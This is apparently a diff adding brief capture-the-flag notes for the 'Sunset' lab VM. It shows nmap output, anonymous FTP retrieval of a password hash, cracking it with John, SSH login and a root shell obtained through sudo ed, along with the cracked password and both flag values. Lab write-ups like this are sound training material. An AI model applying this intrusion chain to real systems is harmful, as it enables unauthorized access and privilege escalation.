@@ -1,0 +1,62 @@
+Sunset
+
+netdiscover -r 192.168.56.0/24 -i eth1
+
+nmap -T4 -sV -A -p- 192.168.56.116
+	Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-04 19:26 EDT
+	Nmap scan report for 192.168.56.116
+	Host is up (0.0031s latency).
+	Not shown: 65533 closed ports
+	PORT   STATE SERVICE VERSION
+	21/tcp open  ftp     pyftpdlib 1.5.5
+	| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+	|_-rw-r--r--   1 root     root         1062 Jul 29 00:00 backup
+	| ftp-syst: 
+	|   STAT: 
+	| FTP server status:
+	|  Connected to: 192.168.56.116:21
+	|  Waiting for username.
+	|  TYPE: ASCII; STRUcture: File; MODE: Stream
+	|  Data connection closed.
+	|_End of status.
+	22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
+	| ssh-hostkey: 
+	|   2048 71:bd:fa:c5:8c:88:7c:22:14:c4:20:03:32:36:05:d6 (RSA)
+	|   256 35:92:8e:16:43:0c:39:88:8e:83:0d:e2:2c:a4:65:91 (ECDSA)
+	|_  256 45:c5:40:14:49:cf:80:3c:41:4f:bb:22:6c:80:1e:fe (ED25519)
+	MAC Address: 08:00:27:36:41:02 (Oracle VirtualBox virtual NIC)
+	Device type: general purpose
+	Running: Linux 3.X|4.X
+	OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+	OS details: Linux 3.2 - 4.9
+	Network Distance: 1 hop
+	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+ftp 192.168.56.116
+get backup
+get just the sunset account into a file (copy + paste and nano sunset.txt)
+
+sunset:$6$406THujdibTNu./R$NzquK0QRsbAUUSrHcpR2QrrlU3fA/SJo7sPDPbP3xcCR/lpbgMXS67Y27KtgLZAcJq9KZpEKEqBHFLzFSZ9bo/
+john decode -show
+sunset:cheer14
+
+ssh sunset@192.168.56.116
+ls
+cat user.txt (first flag: 5b5b8e9b01ef27a1cc0a2d5fa87d7190)
+
+whoami
+uname -a
+	Linux 4.19 Debian 4.19
+sudo su - sunset not allowed to execute /usr/bin/su
+sudo -l
+	User sunset may run the following commands on sunset:
+    (root) NOPASSWD: /usr/bin/ed
+
+sudo /usr/bin/ed
+! /bin/bash
+
+boom root
+cd /root
+ls
+cat flag.txt
+25d7ce0ee3cbf71efbac61f85d0c14fe
